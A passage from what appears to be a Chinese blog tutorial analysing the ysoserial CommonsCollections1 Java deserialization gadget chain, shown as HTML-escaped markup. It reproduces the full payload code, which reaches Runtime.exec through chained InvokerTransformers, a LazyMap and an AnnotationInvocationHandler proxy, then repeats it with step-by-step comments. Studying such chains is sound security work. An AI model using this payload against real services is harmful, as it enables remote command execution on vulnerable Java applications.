class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Gadget chain:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		ObjectInputStream.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;			AnnotationInvocationHandler.readObject()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;				Map(Proxy).entrySet()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;					AnnotationInvocationHandler.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;						LazyMap.get()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;							ChainedTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								ConstantTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Class.getMethod()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.getRuntime()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;								InvokerTransformer.transform()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;									Method.invoke()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;										Runtime.exec()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	Requires:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;		commons-collections&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@SuppressWarnings(&amp;#123;&amp;quot;rawtypes&amp;quot;, &amp;quot;unchecked&amp;quot;&amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@PayloadTest&lt;/span&gt; ( precondition = &lt;span class=&#34;string&#34;&gt;&amp;quot;isApplicableJavaVersion&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Dependencies(&amp;#123;&amp;quot;commons-collections:commons-collections:3.1&amp;quot;&amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;@Authors(&amp;#123; Authors.FROHOFF &amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;CommonsCollections1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;PayloadRunner&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;implements&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ObjectPayload&lt;/span&gt;&amp;lt;&lt;span class=&#34;title&#34;&gt;InvocationHandler&lt;/span&gt;&amp;gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; InvocationHandler &lt;span class=&#34;title&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String command)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] execArgs = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[] &amp;#123; command &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// inert chain for setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map innerMap = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map lazyMap = LazyMap.decorate(innerMap, transformerChain);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		Reflections.setFieldValue(transformerChain, &lt;span class=&#34;string&#34;&gt;&amp;quot;iTransformers&amp;quot;&lt;/span&gt;, transformers); &lt;span class=&#34;comment&#34;&gt;// arm with actual transformer chain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; handler;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] args)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		PayloadRunner.run(CommonsCollections1.class, args);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;isApplicableJavaVersion&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; JavaVersion.isAnnInvHUniversalMethodImpl();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&#34;调试分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调试分析&#34;&gt;#&lt;/a&gt; 调试分析&lt;/h1&gt;
&lt;p&gt;ysoserialPOC 类中 getObject 方法一般是获取 payload 的方法&lt;/p&gt;
&lt;h2 id=&#34;分析paylaod构造&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#分析paylaod构造&#34;&gt;#&lt;/a&gt; 分析 paylaod 构造&lt;/h2&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; InvocationHandler &lt;span class=&#34;title&#34;&gt;getObject&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String command)&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;throws&lt;/span&gt; Exception &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 传入的命令参数存储于execArgs数组中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; String[] execArgs = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; String[] &amp;#123; command &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 开始构造transformerChain，用于执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// inert chain for setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 这一步据p神所言是为了隐藏日志中的进程日常信息， 加不加都会执行命令，只是异常信息不同&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer transformerChain = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ChainedTransformer(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[]&amp;#123; &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// real chain for after setup&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 通过反射获得Runtime.exec(),并将命令参数execArgs传入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Transformer[] transformers = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Transformer[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(Runtime.class),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;getMethod&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					String.class, Class[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;string&#34;&gt;&amp;quot;getRuntime&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;invoke&amp;quot;&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					Object.class, Object[].class &amp;#125;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[] &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;null&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Object[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] &amp;#125;),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; InvokerTransformer(&lt;span class=&#34;string&#34;&gt;&amp;quot;exec&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;					&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; Class[] &amp;#123; String.class &amp;#125;, execArgs),&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; ConstantTransformer(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 修饰innerMap，将构造的transformerChain传入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 当LayMap#get被调用时，会执行传入的transformerChain&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map innerMap = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; HashMap();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map lazyMap = LazyMap.decorate(innerMap, transformerChain);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 将lazyMap传入AnnotationInvocationHandler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// java代理sun.reflect.annotation.AnnotationInvocationHandler&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;comment&#34;&gt;// 获得代理对象时，会再传入一个handler（简称handler2），得到代理对象mapProxy，&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 将该代理对象包裹进入新的handler，简称handler1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;final&lt;/span&gt; InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;comment&#34;&gt;// 